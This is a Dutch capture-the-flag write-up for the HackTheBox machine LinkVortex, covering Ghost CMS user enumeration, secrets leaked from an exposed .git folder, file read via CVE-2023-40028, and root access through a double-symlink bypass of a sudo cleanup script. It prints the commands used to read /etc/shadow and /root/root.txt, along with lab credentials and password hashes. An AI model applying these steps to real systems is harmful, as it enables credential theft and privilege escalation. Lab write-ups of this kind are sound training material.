# LinkVortex

- Draait op een open source `ghost` blog platform, `v5.58`
- Er is een `dev.linkvortex.htb` subdomein
- Alleen poort 22, 80 staan open

Kijkend naar `http://linkvortex.htb` en de `ghost/api/admin/session` endpoint
dan kunnen we achterhalen welke emails er zijn. Dit geeft namelijk terug of een
email of wachtwoord incorrect is.

```bash
curl -d username=admin@linkvortex.htb -d password=BitByBit 'http://dev.linkvortex.htb/ghost/api/admin/session/' -v
```

Hiermee weten we dat er een `admin@linkvortex.htb` gebruiker bestaat.

# .git

Op `dev.linkvortex.htb` staat de git folder open. Hiermee kunnen we dus naar
alle commits kijken en ook alle source-code uitlezen. Een kleine `git log` op
deze data toont wel de data van het `ghost` project.

Maar dit betekend wel dat listing van directories aanstaat en dat er
waarschijnlijk wat leuke data gewoon opgehaald kan worden.

Na heel veel verder zoeken het volgende gedaan:

```bash
# Alle bestanden uitgecheckt
git checkout .

# Hiermee het verschil met tussen HEAD en de laatste commit opgehaald
git diff HEAD^1
```

Hier zien we een change aan `api/admin/authentication.test.js` waarbij
`password=thisissupersafe` is aangepast naar `OctopiFociPilfer45`

# CVE 2023-40028

Wanneer ik dit wachtwoord gebruik met de eerder gevonden CVE hebben we toegang
tot alle files op de server. Mits de `www-data` user toegang heeft en we het
path weten.

Een cat van `/etc/passwd` later en we hebben een extra user te pakken:

```
root:x:0:0:root:/root:/bin/bash
node:x:1000:1000::/home/node:/bin/bash
```

Verder zoeken en de install folder van `ghost` is in `/var/lib/ghost/`. Hier
kunnen we een config file uitlezen. Hierin staat een email config met daarin de
volgende gegevens:

```json
"auth": {
  "user": "bob@linkvortex.htb",
  "pass": "fibber-talented-worth"
}
```

Met deze data kunnen we SSH'en en hebben we de user flag te pakken.

> Note to self. Eerder deze data proberen...

# Privesc

Met `sudo -l` zien we dat bob een script mag uitvoeren als admin. Namelijk:

```bash
/usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Het `clean_symlink.sh` script bevat:

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

Dit script kan gebruikt worden om `*.png` symlinks op te ruimen. Deze worden dan
in `/var/quarantined` gegooid met volledige leesrechten. Het idee is dus als
volgt:

- We maken een symlink naar een interessant bestand, zoals `/etc/shadow`
- Ruimen die op via dit script
- Lezen daarna dit bestand uit
- Profit

Nu wordt `/etc` en `/root` wel geblokkeerd maar hier kunnen we lang door een
symlink te maken naar deze folders waarna we hiernaar symlinken.

```bash
export CHECK_CONTENT=true # Dit is nodig zodat het script spul logt
cd /tmp/freckles

ln -s /etc foo
ln -s /tmp/freckles/foo/shadow bar.png

sudo /usr/bin/bash /opt/ghost/clean_symlink.sh bar.png
```

Hiermee krijgen we alles wat we willen:

```
bob@linkvortex:/tmp/freckles$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh l.png
Link found [ l.png ] , moving it to quarantine
Content:
root:$y$j9T$C3zg87gHwrCXO0vl4igIh/$iisf9sVwilKAi7mI5p1FqQslJWM9t2.YUWznIPC/XIA:19
bob:$6$rounds=656000$4p3mw8hAd9ir.25f$ocGm9nW1TM2AB8Z.l0K.hi43bOrm3oxQsaKFACMoS2U
```

En dit is ook te gebruiken om de `/root/root.txt` uit te lezen
